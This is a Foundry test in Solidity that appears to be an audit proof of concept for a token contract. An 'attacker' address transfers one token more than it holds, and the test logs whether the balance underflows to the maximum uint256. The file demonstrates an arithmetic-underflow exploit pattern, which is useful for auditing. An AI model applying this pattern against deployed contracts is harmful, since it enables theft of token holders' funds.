// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/token.sol";

contract TokenUnderflowTest is Test {
    Token public token;
    address owner = address(1);
    address attacker = address(2);
    address recipient = address(3);

    function setUp() public {
        vm.prank(owner);
        // Deploy token with initial supply to owner
        token = new Token(500);
        
        // Send a small balance to attacker
        vm.prank(owner);
        token.transfer(attacker, 100);
    }

    function test_transferUnderflow() public {
        // Capture pre-attack balances
        console.log("--- BEFORE Attacker Transfer ---");
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 recipientBalanceBefore = token.balanceOf(recipient);
        console.log("Attacker balance: ", attackerBalanceBefore);
        console.log("Recipient balance: ", recipientBalanceBefore);
        
        console.log("--- EXECUTE Attacker Transfer (101 tokens) ---");
        // Prepare 101 token transfer (> balance)
        vm.prank(attacker);
        token.transfer(recipient, 101);
        
        console.log("--- AFTER Attacker Transfer ---");
        // Capture post-attack balances
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 recipientBalanceAfter = token.balanceOf(recipient);
        console.log("Attacker balance: ", attackerBalanceAfter);
        console.log("Recipient balance: ", recipientBalanceAfter);
        
        // Verify balance changes
        bool underflowOccurred = (attackerBalanceAfter == type(uint256).max) && 
                                (recipientBalanceAfter == recipientBalanceBefore + 101);
        
        // Print test results
        console.log("Attacker balance underflow:", underflowOccurred ? "YES" : "NO");
        
        // Final vulnerability verdict
        if(underflowOccurred) {
            console.log("Vulnerability Exists: Token transfer causes balance underflow reaching max uint256");
        } else {
            console.log("Vulnerability not Exist: Transfer did not cause expected underflow behavior");
        }
    }
}